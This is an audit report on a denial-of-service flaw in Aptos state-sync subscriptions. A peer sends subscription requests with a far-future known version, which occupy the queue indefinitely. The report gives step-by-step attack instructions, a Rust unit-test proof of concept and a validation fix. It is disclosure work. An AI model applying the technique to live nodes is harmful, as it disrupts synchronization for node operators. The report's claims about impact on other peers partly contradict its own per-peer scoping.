# Audit Report

## Title
Subscription Stream Resource Exhaustion via Future Version DoS

## Summary
A malicious peer can cause subscription streams to hang indefinitely by setting `known_version_at_stream_start` to a version higher than the current ledger tip. By continuously sending new subscription requests before timeout, an attacker can fill the bounded subscription queue (30 slots by default) and block legitimate subscription requests, causing a denial-of-service condition on state synchronization for that peer.

## Finding Description

The subscription stream mechanism lacks validation that `known_version_at_stream_start` is within the valid range (≤ current ledger tip). This creates a vulnerability where subscriptions with future versions never become ready for serving. [1](#0-0) 

When a new `SubscriptionStreamRequests` is created, the `highest_known_version` is directly extracted from the client-provided metadata without any bounds checking.

The critical flaw occurs in the ready-subscription identification logic: [2](#0-1) 

If `highest_known_version >= highest_synced_version`, the subscription is silently skipped—never added to ready or invalid lists. It remains pending indefinitely.

An attacker can bypass expiration by continuously sending new subscription requests: [3](#0-2) 

Each new request refreshes the stream's timeout timer (line 390), preventing expiration. The bounded queue enforces a maximum of 30 active subscriptions per peer: [4](#0-3) [5](#0-4) 

**Attack Scenario:**
1. Attacker creates subscription with `known_version_at_stream_start` = current_ledger_version + 1,000,000
2. Subscription check at line 920 evaluates false (known ≥ synced), subscription never becomes ready
3. Attacker sends new subscription requests every 20 seconds (before 30-second timeout)
4. Each request increments `subscription_stream_index`, fills one of 30 slots
5. After 30 requests, queue is full—legitimate subscriptions rejected
6. Subscription stream remains stuck, consuming memory, blocking state sync

## Impact Explanation

This is a **Medium Severity** vulnerability per Aptos bug bounty criteria:

- **Limited Denial of Service**: Affects only the specific peer's subscription stream, not network-wide
- **Resource Consumption**: Up to 30 pending subscription requests consume memory per peer
- **State Sync Disruption**: Legitimate subscription requests cannot be processed, degrading state synchronization for that peer
- **No Consensus Impact**: Does not affect consensus safety, validator operations, or fund security
- **Requires Continuous Engagement**: Attacker must maintain periodic requests to prevent timeout

The vulnerability breaks the "Resource Limits" invariant—subscription resources should have proper bounds and eventual cleanup, but malformed requests can occupy slots indefinitely.

## Likelihood Explanation

**High Likelihood** of exploitation:

- **No Privileges Required**: Any network peer can send subscription requests
- **Simple to Execute**: Requires only crafting requests with future version numbers
- **Low Complexity**: Attacker needs basic network access and understanding of the subscription protocol
- **Difficult to Detect**: Appears as legitimate subscription traffic until queue fills
- **Per-Peer Impact**: Each attacker connection can DoS its own subscription stream

The lack of input validation makes this trivially exploitable by any malicious peer.

## Recommendation

Add validation when creating subscription streams to ensure `known_version_at_stream_start` does not exceed the current ledger tip:

```rust
// In SubscriptionStreamRequests::new()
pub fn new(
    subscription_request: SubscriptionRequest,
    time_service: TimeService,
    highest_synced_version: u64,  // Add parameter
) -> Result<Self, Error> {
    // Extract the relevant information from the request
    let highest_known_version = subscription_request.highest_known_version_at_stream_start();
    let highest_known_epoch = subscription_request.highest_known_epoch_at_stream_start();
    
    // Validate known version is not in the future
    if highest_known_version > highest_synced_version {
        return Err(Error::InvalidRequest(format!(
            "Known version {} exceeds current synced version {}",
            highest_known_version, highest_synced_version
        )));
    }
    
    let subscription_stream_metadata = subscription_request.subscription_stream_metadata();
    // ... rest of implementation
}
```

Additionally, in the handler, retrieve the current synced version before creating the stream:

```rust
// In Handler::handle_subscription_request()
let highest_synced_version = self.cached_storage_server_summary
    .load()
    .data_summary
    .synced_ledger_info
    .as_ref()
    .map(|li| li.ledger_info().version())
    .unwrap_or(0);

let subscription_stream = match SubscriptionStreamRequests::new(
    subscription_request,
    self.time_service.clone(),
    highest_synced_version,
) {
    Ok(stream) => stream,
    Err(error) => {
        // Handle validation error, notify client
        return;
    }
};
```

## Proof of Concept

```rust
#[tokio::test]
async fn test_subscription_future_version_dos() {
    use aptos_storage_service_types::requests::*;
    use crate::subscription::SubscriptionStreamRequests;
    
    // Setup
    let time_service = TimeService::mock();
    let current_ledger_version = 100u64;
    
    // Create subscription with future version
    let future_version = 1000000u64; // Far beyond current tip
    let metadata = SubscriptionStreamMetadata {
        known_version_at_stream_start: future_version,
        known_epoch_at_stream_start: 0,
        subscription_stream_id: 1,
    };
    
    let request = StorageServiceRequest::new(
        DataRequest::SubscribeTransactionsWithProof(
            SubscribeTransactionsWithProofRequest {
                subscription_stream_metadata: metadata,
                subscription_stream_index: 0,
                include_events: false,
            }
        ),
        false,
    );
    
    let (response_sender, _receiver) = oneshot::channel();
    let subscription_request = SubscriptionRequest::new(
        request,
        response_sender,
        time_service.clone(),
    );
    
    // Create stream - NO VALIDATION occurs
    let mut stream = SubscriptionStreamRequests::new(
        subscription_request,
        time_service.clone(),
    );
    
    // Verify known version is future version
    let (known_version, _) = stream.get_highest_known_version_and_epoch();
    assert_eq!(known_version, future_version);
    
    // Simulate ready subscription check
    // With known_version (1000000) > synced_version (100),
    // the condition at line 920 is FALSE
    // Subscription is NEVER marked as ready
    assert!(known_version > current_ledger_version);
    
    // Add 30 more requests to fill the queue
    for i in 1..31 {
        let metadata_i = SubscriptionStreamMetadata {
            known_version_at_stream_start: future_version,
            known_epoch_at_stream_start: 0,
            subscription_stream_id: 1,
        };
        
        let request_i = StorageServiceRequest::new(
            DataRequest::SubscribeTransactionsWithProof(
                SubscribeTransactionsWithProofRequest {
                    subscription_stream_metadata: metadata_i,
                    subscription_stream_index: i,
                    include_events: false,
                }
            ),
            false,
        );
        
        let (sender, _) = oneshot::channel();
        let sub_req = SubscriptionRequest::new(
            request_i,
            sender,
            time_service.clone(),
        );
        
        let config = StorageServiceConfig::default();
        let result = stream.add_subscription_request(config, sub_req);
        
        if i < 30 {
            assert!(result.is_ok(), "Request {} should succeed", i);
        } else {
            // 31st request should fail - queue full!
            assert!(result.is_err(), "Request 30 should fail - queue full");
        }
    }
    
    // Queue is now full with 30 pending requests that will NEVER be served
    // Legitimate subscriptions will be rejected
    assert_eq!(stream.get_pending_subscription_requests().len(), 30);
}
```

**Notes:**

The vulnerability exists because the subscription stream logic assumes clients provide honest `known_version_at_stream_start` values. Without validation, malicious peers can exploit this to create resource exhaustion conditions. The fix requires adding a simple bounds check against the current synced ledger version when creating new subscription streams. This preserves the subscription streaming functionality while preventing abuse through future version values.

### Citations

**File:** state-sync/storage-service/server/src/subscription.rs (L314-336)
```rust
    pub fn new(subscription_request: SubscriptionRequest, time_service: TimeService) -> Self {
        // Extract the relevant information from the request
        let highest_known_version = subscription_request.highest_known_version_at_stream_start();
        let highest_known_epoch = subscription_request.highest_known_epoch_at_stream_start();
        let subscription_stream_metadata = subscription_request.subscription_stream_metadata();

        // Create a new set of pending subscription requests using the first request
        let mut pending_subscription_requests = BTreeMap::new();
        pending_subscription_requests.insert(
            subscription_request.subscription_stream_index(),
            subscription_request,
        );

        Self {
            highest_known_version,
            highest_known_epoch,
            next_index_to_serve: 0,
            pending_subscription_requests,
            subscription_stream_metadata,
            last_stream_update_time: time_service.now(),
            time_service,
        }
    }
```

**File:** state-sync/storage-service/server/src/subscription.rs (L341-404)
```rust
    pub fn add_subscription_request(
        &mut self,
        storage_service_config: StorageServiceConfig,
        subscription_request: SubscriptionRequest,
    ) -> Result<(), (Error, SubscriptionRequest)> {
        // Verify that the subscription metadata is valid
        let subscription_stream_metadata = subscription_request.subscription_stream_metadata();
        if subscription_stream_metadata != self.subscription_stream_metadata {
            return Err((
                Error::InvalidRequest(format!(
                    "The subscription request stream metadata is invalid! Expected: {:?}, found: {:?}",
                    self.subscription_stream_metadata, subscription_stream_metadata
                )),
                subscription_request,
            ));
        }

        // Verify that the subscription request index is valid
        let subscription_request_index = subscription_request.subscription_stream_index();
        if subscription_request_index < self.next_index_to_serve {
            return Err((
                Error::InvalidRequest(format!(
                    "The subscription request index is too low! Next index to serve: {:?}, found: {:?}",
                    self.next_index_to_serve, subscription_request_index
                )),
                subscription_request,
            ));
        }

        // Verify that the number of active subscriptions respects the maximum
        let max_num_active_subscriptions =
            storage_service_config.max_num_active_subscriptions as usize;
        if self.pending_subscription_requests.len() >= max_num_active_subscriptions {
            return Err((
                Error::InvalidRequest(format!(
                    "The maximum number of active subscriptions has been reached! Max: {:?}, found: {:?}",
                    max_num_active_subscriptions, self.pending_subscription_requests.len()
                )),
                subscription_request,
            ));
        }

        // Insert the subscription request into the pending requests
        let existing_request = self.pending_subscription_requests.insert(
            subscription_request.subscription_stream_index(),
            subscription_request,
        );

        // Refresh the last stream update time
        self.refresh_last_stream_update_time();

        // If a pending request already existed, return the previous request to the caller
        if let Some(existing_request) = existing_request {
            return Err((
                Error::InvalidRequest(format!(
                    "Overwriting an existing subscription request for the given index: {:?}",
                    subscription_request_index
                )),
                existing_request,
            ));
        }

        Ok(())
    }
```

**File:** state-sync/storage-service/server/src/subscription.rs (L918-965)
```rust
        let active_task = runtime.spawn_blocking(move || {
            // Check if we have synced beyond the highest known version
            if highest_known_version < highest_synced_version {
                if highest_known_epoch < highest_synced_epoch {
                    // Fetch the epoch ending ledger info from storage (the
                    // peer needs to sync to their epoch ending ledger info).
                    let epoch_ending_ledger_info = match utils::get_epoch_ending_ledger_info(
                        cached_storage_server_summary.clone(),
                        optimistic_fetches.clone(),
                        subscriptions.clone(),
                        highest_known_epoch,
                        lru_response_cache.clone(),
                        request_moderator.clone(),
                        &peer_network_id,
                        storage.clone(),
                        time_service.clone(),
                    ) {
                        Ok(epoch_ending_ledger_info) => epoch_ending_ledger_info,
                        Err(error) => {
                            // Log the failure to fetch the epoch ending ledger info
                            error!(LogSchema::new(LogEntry::SubscriptionRefresh)
                                .error(&error)
                                .message(&format!(
                                    "Failed to get the epoch ending ledger info for epoch: {:?} !",
                                    highest_known_epoch
                                )));

                            return;
                        },
                    };

                    // Check that we haven't been sent an invalid subscription request
                    // (i.e., a request that does not respect an epoch boundary).
                    if epoch_ending_ledger_info.ledger_info().version() <= highest_known_version {
                        peers_with_invalid_subscriptions
                            .lock()
                            .push(peer_network_id);
                    } else {
                        peers_with_ready_subscriptions
                            .lock()
                            .push((peer_network_id, epoch_ending_ledger_info));
                    }
                } else {
                    peers_with_ready_subscriptions
                        .lock()
                        .push((peer_network_id, highest_synced_ledger_info.clone()));
                };
            }
```

**File:** config/src/config/state_sync_config.rs (L174-174)
```rust
    pub max_num_active_subscriptions: u64,
```

**File:** config/src/config/state_sync_config.rs (L206-206)
```rust
            max_num_active_subscriptions: 30,
```
